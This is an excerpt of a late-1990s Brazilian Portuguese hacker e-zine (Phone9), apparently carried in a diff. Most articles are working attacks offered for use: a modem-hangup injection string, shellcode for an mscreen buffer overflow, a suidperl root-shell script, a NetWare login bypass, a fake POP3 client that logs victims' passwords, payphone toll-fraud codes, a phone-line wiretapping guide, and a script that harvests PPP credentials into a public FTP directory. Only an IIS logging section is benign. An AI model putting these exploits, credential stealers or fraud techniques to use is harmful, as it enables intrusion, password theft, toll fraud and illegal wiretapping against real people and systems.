+ # comando bugante :)
+ USER +++ATH0
+ ^] #saindo...
+ 
+ Entao, se voce fizer o comando denovo a rede tera caido, e a conexao PPP,
+ estara totalmente morta... Eu estou trabalhando em um codigo que fara isto
+ para voce, enviando diretamente para a primeira porta aberta anonyma, entao
+ aguarde na proxima edicao da P9 :)
+
+ Caso voce esteja conectado no sendmail (25), use o comando:
+ VRFY +++ATH0
+
+ [ mscreen buffer overflow ] ---------------------------------------------- 
+											  by pr0k 
+
+ Mscreen, programa usado para exibir caracteres especiais e ASCII, tem um
+ buffer overflow... Exploite-o (somente para Unix-sco).
+
+--[ mscreen-sco.sh ]--
+#!/bin/sh
+echo '***4.999,99***('\
+'\0220\0353*]U\0376M\0347\0376M\0353\0376M\0354\0376M\0355\0377E\0357\0376M'
+\'\0364\0303/bin/sh\01\0215\05;\01\01\01\0232\0377\0377\0377\0377\07\01\0307
+'\'\0304"\0365\04\010\0350\0313\0377\0377\0377\0201\0305\0357\0377\0377\0377
+U'\'U\0201\0305\0361\0377\0377\0377U\0350\0324\0377\0377\0377)'>$HOME/.msrn
+echo 'leshka:*leshka**leshka**leshka*#\0365\04\010:'>$HOME/msrncap
+MSCREENCAP=$HOME/mscreencap TERM=leshka; export MSCREENCAP TERM
+echo "Type any command than press <ENTER> and <CTRL>-D"
+cat|/usr/bin/mscreen;rm $HOME/.msrn $HOME/mscreencap
+--[ mscreen-sco.sh ]--
+
+ [ Perl Exploiter ] -------------------------------------------------------
+ 										     by H. b0ws
+
+  O codigo abaixo, exploita suidperls, que sao a forma mais estupida de se
+  executar um programa em linux. 
+
+--[ perl-ex.sh ]--
+#!/usr/bin/suidperl -U
+$>=0; $<=0;
+exec ("/bin/sh");
+--[ perl-ex.sh ]--
+
+Na shell...
+$ chmod 4755 perl-ex.sh
+$ ./perl-ex.sh
+#
+
+  E tudo fica beleza :)...
+              _               ______________
+     ________[_] _______  _   \_           /_______  __    _____________
+    /     \  \ \/  ___/ \/ \   /     --   /        //  /  \  \  ____/ - \
+   /   --  \  \_\ ___/ /   /  /          /    -    /\  \||/  / ___/  ___/
+  /____\    \____\___\/\__/ _/    ______/\________/  \__/\__/____ \  __ \
+      /_____/               \/-----/                             \/\/  \/
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³14 - IIS security issues, trabalhando com logs.	                   ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by bloodroot ³°°
+		  	  			   			    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+
+
+ IIS 40 server da microsoft, possui um interessante sistema de log que pode 
+ ser facilmente configuravel por qualquer administradores. O simples ato de
+ se manter um sistema de logs no IIS, podendo controlar o acesso nos servi-
+ cos http, e ftp.
+ 
+ Bom, sem mais demoras, na tentativa de fazer um texto dinamico,  ai vao as 
+ tecnicas...
+
+ .Configurando log WWW (http):
+
+ Quando olhando para um arquivo de log, voce deve ter na mente que as infor
+ macoes necessarias deverao estar facilmente dispostas para que a visao  do
+ administrador sobre o log seja rapida e conclusiva :) 
+ Os arquivos LOG, podem te dar historicos sobre conexoes feitas sobre deter
+ minados IP addresses, que ultimamente visitaram o seu site,  contendo toda
+ a documentacao de troca de dados ftp,  ou http,  entre  outras informacoes
+ que podem garantir um pouco mais a seguranca do seu site ou servidor. Basi
+ camente estas sao as maravilhas que o arquivo de log do IIS pode fazer por
+ voce.
+
+ Passo-a-passo, para configurar o sistema de log:
+ 1. Selecione iniciar|Programas|Windows NT 4.0 Option Pack| Microsoft Inter
+ net Information Server| Internet Service Manager (ISM)|  e logo apos  isto
+ ira abrir-se uma janela chamada MMC (Microsoft Management Console).
+ 2. Clique com o botao-direito do mause, no website que voce deseja configu
+ rar.
+ 3. Clique no botao de propriedades. Entao aparecera a janela de proprieda-
+ des do website...
+ 4. Clique em "Enable Logging".
+ 5. E entao escolha a opcao de log que mais se adequa ao seu sistema.
+  Veja:
+
+ .Microsoft IIS log Format.  Este e' fixado no formato ASCII de texto,  ele
+ loga os acessos nos seguintes items:
+
+	- Username
+	- IP address
+   	- Numero de bytes recebidos
+	- Codigo de status do HTTP
+ 	- Data requisitada no sistema
+	- Tempo de conexao ao sistema
+ 
+ Este log e em formato ASCII o que permite que seja visto em quase todos os
+ editores de textos de todas as OSs que voce imaginar.
+
+--
+
+ .NCSA Common Log File Format. Este tambem e' baseado em formato ASCII, su- 
+ portato pode National Computer Supercomputing Applications  (NCSA).  Neste
+ log, ele grava as seguintes informacoes:
+
+	- UserName Remoto
+	- username
+	- Codigo de status do HTTP
+	- Tipo de arquivo requisitado
+	- numero de dados requisitados
+	- Tipo e numero de arquivos recebdiso pelo servidor
+
+ Basicamente igual ao IIS. :)
+
+--
+
+ ODBC logging. Suportado pelo tipo de arquivo que e' anexado a uma database
+ este log grava as seguintes informacoes:
+
+	- IP address
+	- username
+	- data requisitada
+	- data recebida
+	- byte enviados
+	- acoes executadas pelo cliente
+	- Host de onde veio e para onde foi. :)
+
+ Este log e anexado a um certo grupo de arquivos, permitindo que voce somen
+ te grave o log de acoes em determinados em diretorios, como o de usuarios,
+ e ou ate de todo o servidor. E' necessario determinar isto antes de habili
+ tar este log.
+
+--
+ 
+ W3C Extended Log File Format. Ate agora, este e' o melhor log ja testado e
+ usado para databases IIS 4.0 e outras em toda a minha vida, ele faz syslog
+ parecer codigo de crianca perto dele :)
+ Usando um sistema ASCII de log, esta e' a opcao padrao usada pelo IIS, em-
+ bora eu aconselho que voce nao mude-a. 
+ Voce pode acrescentar varias configuracoes a este log, que estao dispostas
+ nesta mesma janela, mas na opcao padrao voce tem os seguintes componentes:
+
+	- IP address
+	- IP address do servidor
+	- Porta do Servidor
+	- Codigo de status HTTP
+	- Data solicitada
+	- Tempo de download da data.
+
+ A data e' separada em espacos neste formato de log.
+ Para acrescentar mais componentes no log, faca o seguinte:
+ 
+ 1. Clique no botao de propriedades.  Entao a janela "Extended Logging Pro-
+ perties". 
+ 2. Na secao "New Log Time Period", coloque o tempo em que voce quer  que o
+ IIS crie um arquivo de log, para o website selecionado,  voce pode colocar
+ a opcao para somente criar  o log quando for 20:00h. da noite,  assim voce 
+ pode acessar o log assim que voce chegar do trabalho :)
+ 3. Entre o diretorio do qual voce quer guardar o log dentro:
+ O padrao e' %WinDir\System32\LogFiles.  Clique no browser para  selecionar
+ outro diretorio.
+ 4. Clique na opcao "Extended Properties tab" para mostrar as opcoes de log
+ que o W3C oferece (esta opcao sera mostrada quando voce selecionar a opcao
+ W3C Extended Log File Format). Voce pode acessar esta opcao,  acessando  a
+ opcao describe (descricao) na tabela no.1, a opcao de default do W3C.  in-
+ cluem as opcoes mostradas acima. E as novas opcoes:
+
+	- Data da atividade
+	- Tempo da atividade
+	- Endereco IP do cliente
+	- Endereco IP do servidor
+	- User Name
+	- Nome do Servidor
+	- Porta do servidor
+	- Acao que o cliente executo (METHOD)
+	- Mostra as atividades no seu sistema URI, como as paginas que o usua
+   	  rio acessou, como pagina HTML e programas CGI.
+	- URI Query, Loga as strings que o usuarios tentou acessar que falha-
+  	  ram ou funcionaram.
+	- Win32 Status, status do cliente em acao.
+	- Bytes enviados
+	- Bytes recebidos
+	- Agente do usuario.
+	- Cookie mandados ou recebidos.
+	- Referrer, URL do usuario.
+
+ Lembramos que com tanta opcao, voce pode ativar todas estas, mas o seu ar- 
+ quivo de log pode chegar a 19mb ou ate 300mbytes em dias ou semanas, entao
+ procure sempre tacar o lixo fora :)
+
+ [ Na proxima edicao ] 
+ IIS security Issue 02, saira' trazendo informacoes sobre os seguintes sis-
+ temaS: IIS Server LOG file v2.0, IIS server Bugs.
+
+ IIS server security force:
+ bloodroot - blood@phone9.org
+ bi0h4zard - bio@mutexx.net
+
+ - Internet Information Server Security Issues -
+ A Phone9 Project.
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³15 - Novell Netware login Hack							 ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by bloodroot ³°°
+		  	  			   			    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+
+ Esta tecnica eu fiz na minha escola (os administradores de la ficaram ma-
+ lucos :)) basicamente ela se divide em duas partes, uma que e' inofensiva
+ ao sistema, que somente e' usada para impressionar os seus amigos :)  e a
+ outra e' que voce pode usar para entrar no sistema sem precisar passar pe
+ lo netware logon, apenas forcando uma saida de erro no sistema de logon.
+
+ - Tecnica no.01 [inofensiva] 
+
+ Nesta tecnica voce muda a mensagem padrao que aparece no inicio do logon,
+ "You must login before geting on the system", entao voce pode muda-la  p/
+ qualquer outra mensagem que voce queira, colocando mensagens  terroristas
+ como "A diretorio e' uma filha da puta!!!", entre outras, use suas imagi-
+ nacao, n3rd. Faca o seguinte para executar tal tarefa :)
+ -
+ Otimo, log-se no sistema e faca o seguinte:
+ c:\windows\regedit.exe - editor de registros
+ Va na chave:
+ HKEY_LOCAL_MACHINE\SOFTWARE\microsoft\windows\CurrentVersion\WinLogon,
+ La dentro altere os registos "LegalNoticeCaption" e "LegalNoticeMsg" e as-
+ sim, voce muda o conteudo destes registros e depois e' claro, amedronta os
+ bostinhas da sua sala :)
+
+ - Tecnica no.02 [malvada :]
+
+ Nesta tecnica voce impede que a tela de login  (animada.) do Netware Logon
+ apareca no sistema toda a vez que voce entrar no sistema,  assim voce pode
+ entrar no sistema, mesmo sem ter a senha ou ate mesmo um login valido :)
+ Faca o seguinte para executar tal tarefa:
+ - 
+ Ligue o computador, log-se uma vez no sistema...
+ Depois que voce se logar, va no diretorio:
+ c:\windows\nls\english\ e delete o arquivo login.dat ou entao apenas  mude
+ o nome do bichano, que assim quando voce for se logar no sistema o netware
+ logon ira mostrar uma mensagem de erro assim: 
+ "Error Message: Unable to Open or Find the file c:\windows\xxxxx\login.dat"
+ 
+ Esta e' bem legal, para fazer na rede inteira assim ninguem se loga e o ad
+ min fica boqui-aberta para tal forca hack power :)
+
+                Novell NetWare Logon Hack, by <bloodroot>
+      blood@phone9.0rg | blood@deathknights.com | blood@puruca.com.br
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³16 - POP3 sniffer							             ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by bloodroot ³°°
+		  	  						    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+
+
+ Post Office Protocol v3, e' um dos mais bugados protocolos da historia dos
+ emails, ele nao chega a barrar o sendmail :) Mas ja e' um comeco na histo-
+ ria da rootshell. 
+ 
+ O sniff funciona simplesmente como um cliente que captura o logins e pass-
+ word que uma vez digitados estao disponiveis em arquivo texto-puro (ASCII)
+ O que acontece e: Quando o usuario recebe a mensagem "Login:" e "Password"
+ Automaticamente a variavel $login e $pass, e' copiada para um arquivo log,
+ onde ficarao os sniffers e logo depois com as mesmas variaveis serao  usa-
+ das para se logar em um sistema POP3 que o usuarios especificar :) 
+
+obs. Este sniffer nao faz nenhuma tecnica com o protocolo em si, mas permi-
+     te que voce captura as senhas que voce quiser, desde que este seja co-
+     locado no lugar do cliente oficial para acessar o POP3. :)
+     alph1x t3k esta fazendo um sniffer para POP3 diretamente dentro do pro
+     tocolo junto com outras maravilhas do TCP/IP bugadao, entao aguardem e
+     contemplem o phuturo :) 
+
+Veja o codigo do sniffer:
+[ pop3client ]
+#!/bin/sh
+log = #arquivo onde ficara o log do sniffer
+
+echo "Login:"
+read login;
+echo "Password:"
+read pass;
+echo "Pop3 server:"
+read pop;
+echo "Direcionar mail para o arquivo:"
+read arquivo;
+echo "----" >> $log
+echo "login: $login - Password: $pass - Pop Server: $pop" >> $log
+popclient -3 -u $login -p $senha -o $arquivo $pop
+[ Pop3Client ]
+
+O codigo de acesso ao servidor foi baseado no codigo by Acidmud.
+·······
+contact: [blood@phone9.org]|[acidmud@axur05.org]
+Phone9, Inc. - Post Office Protocol v3.0 Sniffer
+·······
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³17 - 0800 hack-a-call	                   					 ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by dare devil ³°°
+	  	  						         ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+ [ Dare devil productions, 1998. ]
+ [ daredevil_br@hotmail.com - daredevil@phone9.org ]
+ 
+ 
+ 
+     0800 hack-a-call, ligacoes de graca por meio de numeros 0800.
+
+ Estados que sao expostos a vulnerabilidade:
+ - Sao Paulo (interior???)
+ - Rio de Janeiro (interior e capital)
+ - Bahia e nordeste
+ 
+ Qualquer novo teste enviar para: daredevil_br@hotmail.com
+
+ -  LIGANDO DE GRACA DE ORELHÕES, por meio de linhas 0800  -  
+
+Bom, existem muitos textos na Net ensinando a fazer ligacoes a partir de 
+telefones publicos de maneira gratuita ...   mas essa daqui e nova !!!!   
+Preste atenção:
+
+Tire o orelhão do gancho e disque:
+
+0801 111 234
+
+(apos voce discar esse numero das duas uma, ou a mensagem programada ira 
+ dizer que nao existem linhas disponiveis para ligação - ai e so voce ligar
+ novamente em seguida que no maximo na quarta tentativa da certo - ou vai 
+ mandar voce aguardar um instante... Fique despreocupado que e tudo gravacao
+ você não fala com ninguém ...)
+
+Logo apos isso a mensagem ira pedir que voce digite o codigo, digite um dos 
+codigos abaixo:
+
+Cod.: 42029695
+      42029595
+      42029592
+
+(Caso de algum problema esses codigos tente outras variacoes que uma hora da
+ certo...)
+
+Depois de digitar o codigo voce devera digitar o prefixo do numero do tele
+fone que voce quer ligar, por exemplo (011)...   ai e so digitar o prefixo 
+e depois o número...
+
+Ex.: 011 234-5678
+
+Obs.: Esse truque foi descoberto e testado no estado de SP, ainda não sei se
+funciona fora daqui ...  Os estados do qual outras pessoas testaram esta fa-
+lha esta logo acima :-)
+
+Esse truque nao funciona quando feito atraves de telefones particulares!! 
+So em orelhões ...
+-------
+Texto produzido por Daredevil 
+e-mail: daredevil_br@hotmail.com
+UIN=3266647
+
+E livre a distribuicao desse texto desde que mantido o Copright, nao tenha 
+uma atitude Lamer substituindo meu nome pelo seu...  Falow!!!!
+-------
+
+Cumpre lembrar que isso so esta aqui para fins educacionais...  entao saiba 
+que eu Nao tenho absolutamente nada a ver com o que voce fizer com este docu
+mento em si :-) Face yer own problems.
+
+Copyrights 1998, dare devil productions
+daredevil_br@hotmail.com | daredevil@phone9.org
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³18 - Wire Tapping!!! Hackeando linhas telefonicas	 			 ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by bloodroot ³°°
+	  	  						          ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+			   Sekurity Hazard Project, Inc.
+                        .98| Phone9 Production.    
+
+
+              Wire tapping, hackeando linhas telefonicas.
+
+Phone9 krimelabs.				"lye, cheat, steal, fight, muder, the P9
+						"guide to the real way of life. "
+
+ Prefacio,
+
+ Este guia e dedicado as companias de telecomunicacoes como telerj, telesp,
+ telebahia entre outras... Que a um bom tempo,  vem tratando uma  das  mais 
+ rapidas formas de comunicacao, como lixo, ja que o monopolio desta empresa
+ e' devasstadora, ou voce usa uma delas ou voce nao usa nada. Neste guia eu 
+ explicarei como roubar a linha de outra pessoa,  usando-a para fazer liga-
+ coes de graca para qualquer lugar do mundo. Nos acrescentamos que este ti-
+ po de acao, pode dar cadeia, com uma pena de 1 a 7 anos de carceraria, en-
+ tao, nos aconselhamos que voces pensem duas vezes antes de concluirem pen-
+ samentos anarquistas, e historias insolitas nas linhas de outras pessoas.
+ 
+ Este guia tambem e'  dedicado para as pessoas que tem me ajudado  ao longo
+ do anos, a todos estes raquez0es e ratoes,  saudacoes especiais do  Grande
+ ninja master IV, <bloodroot>
+ Thanx y0 dudes.
+
+ 
+ 01] Introducao,
+
+ Telerj, sistema de telecomunicacao convencional via telefone do estado  do
+ Rio de Janeiro, entre outras companias, sao vulneraveis a esta tecnica que
+ eu disponibilizo abaixo. 
+ 
+ Telerj, e' muito bem conhecida devido a sua capacidade de fazer um  traba-
+ lho descente nas linhas telefonicas, entao nos (indiquinadamente), ensina-
+ mos como fazer o trabalho estupido e sem descencia que a telerj. 
+ Esta tecnica foi trabalhada e desenvolvida passo a passo  por bloodroot  e
+ the dert, durante viagens pelas linhas telefonicas dos nossos vizinhos :-)
+
+ Bom, ai vai a tecnica, esperamos que goste do que voce vera...
+
+ 02] A tecnica
+
+ Esta tecnica nao e' nenhuma falha no sistema, e tambem nao procura  explo-
+ rar nenhum vulnerabilidade oculta dentro nos internos das telerdas.  Come-
+ caremos explicando a tecnica, expondo os materiais que voce devera comprar
+ na loja de materiais eletricos ou armazem mais proxima:
+
+ - Uma bargoa (ver a seguir)               - Preco: r$5.00 a $10.00, cada
+ - 2 jacares  (tambem ver a seguir)        - Preco: 20c. a r$1.00, cada
+ - 1 fio telefonico (com conector rj-11)   - Preco: 2metros, r$2.00 a r$5.00 
+ - 1 telefone bem portatil e pequeno.      - Preco: r$10.00 a r$200.00 :)
+
+ item numero.01 - bargoa:
+ Bargoa, e' o conector usado para se conectar em sistema de centrais  digi- 
+ tal, ou seja, ela e' usada em caixa de verificacoes (armarios) que sao  do
+ tipo onde e' necessario um encaixe para que a coneccao possa ser completa-
+ da.
+
+ item numero.02 - jacares:
+ Jacares, de um modo geral sao um dos aparelhos (conector)  mais importante
+ para o processo ser completo, ele permite que voce passe a tensao da linha
+ para o seu telefone portatil,  assim podendo exercutar a ligacao.  Jacares
+ sao geralmente usados para sistemas analogicas de "armarios". E'  necessa-
+ rio comprar estes jacares, pois eles sao basicamente a parte excensial  da
+ acao toda :)
+
+ item numero.03 - fio telefonico:
+ Fios telefonicos, igual aquele que voce usa para conectar o modem a tomada
+ do telefone, ou o telefone a tomada do telefone,  ambos  destes podem  ser
+ usados para este tipo de trabalho, mas nos lembramos que este fio  sofrera
+ serias adaptacoes anatomicas no seu corpo :) Ou seja, e'  sempre bom  com-
+ prar um novo para este tipo de servico, assim voce fica com um  fio  espe-
+ cialmente para este tipo de atividades.
+ 
+ item numero.04 - telefone portatil:
+ Telefone portatil, e' o exemplo de um pequeno telefone, preto que pode ser
+ escondido dentro de qualquer lugar, e pode ser facil de transporta-lo para
+ qualquer lugar que voce queira, em uma calada da noite :)
+
+ 03] Setupando o hardware,
+ 
+ Okay, agora e a parte mais dificil de ilustrar em um modo ASCII mas eu vou
+ tentar do mesmo jeito :)
+
+ A primeira coisa que voce deve fazer e':
+ - Comprar tudo :)
+ 
+ Para setupar o hardware voce ira precisar de uma solda, e somente este ou-
+ tro equipamento.
+
+ Siga este guia passo-a-passo para jackass e conclua sua tarefa:
+ 1. Pegue o fio telefonico (que voce comprou) e corte uma das pontas deles,
+ qual sera a ponta  realmente nao interessa,  mas  o que interessa  e'  que
+ interessa e' que ao cortar a capinha de protecao do fio,  deixe os fios de
+ cobre expostos, eu aconselho que voces deixem 1 a 2 centimetros de fios de
+ cobre para fora para que a solda tenha mais efeito sobre o jacare :)
+ Obs.: Voce devera ter deixado uma ponta com os fios de cobre expostos e  a
+ outra ponta com o conector rj-11, ne!?
+ 
+ 2. Pegue a solda e solde o fio de cobre no jacare,  mas solde direito por-
+ que tem muita solda que na hora "H" nao funciona :) Para esta parte de sol
+ dar, eu nao vou explicar como soldar um jacare, porque qualquer mongoloide
+ deveria saber isto :)
+
+ 3. Agora, parte do trabalho ja esta feita,  agora e' so uma questao de op-
+ cao:
+ - Voce vai usar bargoa???
+ - Voce nao vai usar bargoa???
+
+ Se voce usar bargoa entao faca o seguinte:
+ A bargoa se divide em duas partes,  a primeira parte e' uma ponta dividida
+ basicamente em 4 partes, esta e' a ponta usada para se conectar nos  arma-
+ rios baseados em bargoas. E a outra parte sao duas forquilhas, estas serao
+ onde o jacare devera se prender, passando a corrente do armario para a bar
+ goa, da bargoa para o jacare do jacare para o fio e do fio para o telefone
+ tensionando a linha e assim possibilidando a ligacao :)
+
+ Agora, voce ja tem todo o hardware setupado, entao e' a hora de chegar to-
+ da a acao, em geral :)
+
+ 04] Wire tapping!!!
+
+ Agora e' bem simples, voce tera que seguir alguns pasos e depois protinho, 
+ ligacoes de graca para sempre =)
+
+ - Voce tera que achar uma caixa de verificacao (armario), isto nao e' muito
+   dificil, considerando que do jeito que as telerdas sao tao desorganizadas
+   existem caixas dessas praticamente a cada 2 ruas, e em predio existem uma
+   que distribui a linha para o predio todo =) Ou seja,  voce tem dois alvos
+   possiveis, 1. e' pegar a caixa de verificacao da sua rua e  2. a outra e'
+   voce pegar uma caixa de verificacao do seu predio,  por exemplo ,  aquela 
+   caixa escondida em algum lugar no seu predio, geralmente embutida na pare
+   de.
+
+ Uma vez que voce achou o alvo, voce tera que identificar qual tipo de hard-
+ ware voce ira usar, somente os jacares, ou os jacares e as bargoas, veja:
+
+ Se o armario que voce ver, tiver este formato:
+ xxx  xxx  xxx
+ ( )  ( )  ( )
+ 
+ Onde se precisa de algo para plugar dentro do pequeno conector, entao voce
+ tera que usar uma bargoa,  neste caso o custo aumentara um pouco,  mas sao
+ apenas detalhes.
+
+
+
+ Se o armario que voce ver, tiver este formato:
+ Onde ao invez de um plug, existam pequenos pinos ( parecidos com pregos ), 
+ onde voce ira prender a boca do jacare nos seus pinos para passar a corren
+ te, entao voce tera a sua linha, caso este seja o caso, voce tera que usar
+ somente os jacares e a linha telefonica =)
+
+ 
+ Conectando os pontos e' bem facil, nos iremos primeiro explicar o primeiro
+ caso exposto acima e depois o segundo caso exposto acima:
+
+ 1o. caso: 
+ Este e' o caso mais simples, voce tera que usar a bargoa neste caso, e'bem
+ simples, voce tera que abrir a caixa de verificacao (armario),  depois  de 
+ fazer isto,plug as bargoas nos buracos, assim ate que voce ache alguma bar
+ goa que esteja tensionada e permita que voce use a linha.
+
+ veja o exemplo:
+
+                  xxx
+                  ( ) <--- Buraco
+    
+    ---. <|____ conector da bargoa, este entrara no buraco do armario =) 
+    ---' <|
+
+ Assim, vai passando de 'buraco' por 'buraco' ate voce achar um 'buraco'que
+ tenha linha =)
+
+
+ 2o. caso:
+ Neste caso, voce vera o armario cheio de pinos, com pequenos numeros assim
+ 8a, 8b, 9a, 9b, 7a, 7b. Entre outros,  entao os jacares deverao ser presos
+ nos respectivos pinos, e assim a linha sera tensionada para o seu telefone
+ Este processo e' bem simples, basicamente implica em prender direito o ja-
+ care no armario, mais nada =)
+
+
+ 05] Conclusao
+
+ Agora,  seguintes estes passos voce ja podera ligar de graca para qualquer
+ lugar. Quero dizer, ate mesmo para a BBS da alemanha que o  Acidmud  tanto 
+ fala =)
+
+······
+The Phone9 Communications Systems, Inc.
+contact: [blood@phone9.org]|[phone9@phone9.org]
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³19 - Password smuglers				 			       ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by bloodroot ³°°
+	  	  						          ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+ 
+  Conexoes a internet, sao tao vulneraveis,  ou seja no cliente ou seja no    
+  FreeBSD do servidor, sempre existe um meio de se romper a pequena e camu
+  flavel seguranca e roubar os passwords pendentes de um sistema windows95
+  ou linux. Este texto ensina algumas tecnicas de como se catar o password
+  e de como se proteger te tal estupidos ataques =)
+
+  [ Conexoes PPP bugadas ]
+
+  Pointo to Point Protocol, sao sempre alvo de ataques como o recentemente
+  exposto da l0pht,  entre varios outros,  com a capcidade de permitir uma
+  conexao a internet por meio deste protocolo, entao vamos estudar algumas
+  falhas interessantes neste.
+
+  Embora,  existem varios arquivos de conexao PPP,  os principais arquivos
+  onde os passwords ficam sao: 
+  - /usr/sbin/redialer . E' o programa de redial, quando voce cai da cone-
+  				 xao ele, automaticamente a reestabelece =)
+
+  - /usr/sbin/callback . E' outro programa de redial, tambem guarda o pass
+				 word em ASCII text.
+
+  - /etc/ppp/pap-secrets . E' o arquivo que guarda a senha em conexao CHAP.
+
+  - /usr/sbin/ppp-on . Guarda os password e logins, sobre as variaveis de
+			     ACCOUNT e PASSWORD.
+
+  
+  e no windows95.
+  - c:\programs files\access~1\pppmenu.scp . Script de conexao a rede dial
+							   Up do windows. 
+
+  
+  Okay, entao voce ja sabe basicamente quais sao os arquivos que voce deve
+  ra atacar, e entao voce usa o codigo password smuggler,  um pequeno dae-
+  mon que ao ser executado pela porta tcp - 31337 (hehehehe, BO p0w3r.)
+  Uma vez que um telnet na porta 31337 for dado,  entao  automaticamente o
+  codigo do password smuggler, sera executado e b3wng, voce tera passwords
+  de quase todo o sistema =) 
+
+  [Password Smuggler]
+  #!/bin/sh
+  echo "Password Smuggler v1.2"
+  echo "by <bloodroot> | Phone9.org"
+  echo
+  echo "Aguarde enquanto procuramos pelos passwords....."
+  echo "[Phone9.org]|[puruca.com.br/phone9]|[phone9.org]"
+  echo 
+  if -e /etc/ppp/pap-secrets
+  then
+	 echo "Procurando passwords no arquivo Pap-Secrets"
+	 echo "Pap-Secrets passwords: " >> /tmp/.expose
+	 echo "---------------------- " >> /tmp/.expose
+       cat /etc/ppp/pap-secrets >> /tmp/.expose
+	 
+  else
+	 echo "Pap Secrets Response" >> /tmp/.expose
+	 echo "--------------------" >> /tmp/.expose
+	 echo "Arquivo /etc/ppp/pap-secrets inexistente" >> /tmp/.expose
+  fi
+
+  if -e /usr/sbin/ppp-on
+  then
+	 echo "Procurando passwords no arquivo ppp-on"
+	 echo "PPP-ON passwords: " >> /tmp/.expose
+	 echo "----------------- " >> /tmp/.expose
+	 echo "login: " >> /tmp/.expose
+	 grep ACCOUNT /usr/sbin/ppp-on >> /tmp/.expose
+	 echo "Password: " >> /tmp/.expose
+	 grep PASSWORD /usr/sbin/ppp-on >> /tmp/.expose 
+       echo "Telefone: " >> /tmp/.expose
+	 grep ATDT /etc/ppp/chatscript >> /tmp/.expose
+  else
+ 	 echo "ppp-on Passwords response" >> /tmp/.expose
+	 echo "-------------------------" >> /tmp/.expose
+	 echo "Arquivo /usr/sbin/ppp-on inexistente" >> /tmp/.expose
+  fi
+
+  if -e /usr/sbin/redialer
+  then
+	 echo "Procurando passwords no arquivo redialer"
+	 echo "Redialer Passwords: " >> /tmp/.expose
+	 echo "------------------- " >> /tmp/.expose
+	 echo "Login: " >> /tmp/.expose
+	 grep ACCOUNT /usr/sbin/redialer >> /tmp/.expose
+	 echo "Password: " >> /tmp/.expose
+	 grep PASSWORD /usr/sbin/redialer >> /tmp/.expose
+	 echo "Telefone: ">> /tmp/.expose
+	 grep PHONE1 /usr/sbin/redialer >> /tmp/.expose
+  fi
+
+  if -e /usr/sbin/callback
+  then
+	 echo "Procurando passwords no arquivo callback"
+	 echo "Callback Passwords: " >> /tmp/.expose
+	 echo "------------------- " >> /tmp/.expose
+	 echo "Login: " >> /tmp/.expose
+	 grep ACCOUNT /usr/sbin/callback >> /tmp/.expose
+	 echo "Password: " >> /tmp/.expose
+	 grep PASSWORD /usr/sbin/callback >> /tmp/.expose
+	 echo "Telefone: " >> /tmp/.expose
+	 grep PHONE /usr/sbin/callback >> /tmp/.expose
+  fi
+
+  echo "Verifique o resultado da pesquisa..."
+  cat /tmp/.expose |more
+  echo "O arquivoo esta sendo colocado dentro do servidor FTP, no direto-"
+  echo "rio incoming, /home/ftp/incoming/.p9/passwd.expose."
+  mkdir /home/ftp/incoming/.p9/
